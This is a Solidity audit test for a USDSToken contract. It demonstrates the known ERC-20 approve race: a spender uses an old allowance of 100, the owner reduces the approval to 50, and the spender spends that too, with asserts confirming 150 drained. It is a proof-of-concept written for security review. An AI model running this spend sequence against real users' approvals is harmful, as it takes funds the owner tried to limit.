// SPDX-License-Identifier: MIT
pragma solidity 0.6.11;

import "../src/USDSToken.sol";

interface Vm {
    function prank(address) external;
}

contract DummyCore {}

contract USDSTokenApproveRaceAuditTest {
    Vm internal constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));

    USDSToken internal usds;

    address internal alice = address(0xA11CE);
    address internal spender = address(0xB0B);
    address internal recipient = address(0xCAFE);

    function setUp() public {
        DummyCore troveManager = new DummyCore();
        DummyCore stabilityPool = new DummyCore();

        usds = new USDSToken(address(troveManager), address(stabilityPool), address(this));
        usds.mint(alice, 200 ether);
    }

    function testApproveRaceAllowsOldAllowancePlusNewAllowanceDrain() public {
        vm.prank(alice);
        usds.approve(spender, 100 ether);

        vm.prank(spender);
        usds.transferFrom(alice, recipient, 100 ether);

        vm.prank(alice);
        usds.approve(spender, 50 ether);

        vm.prank(spender);
        usds.transferFrom(alice, recipient, 50 ether);

        _assertEq(usds.balanceOf(recipient), 150 ether, "recipient did not receive both spends");
        _assertEq(usds.balanceOf(alice), 50 ether, "alice balance mismatch after double spend");
        _assertEq(usds.allowance(alice, spender), 0, "allowance should be fully consumed");
    }

    function _assertEq(uint256 actual, uint256 expected, string memory message) internal pure {
        require(actual == expected, message);
    }
}
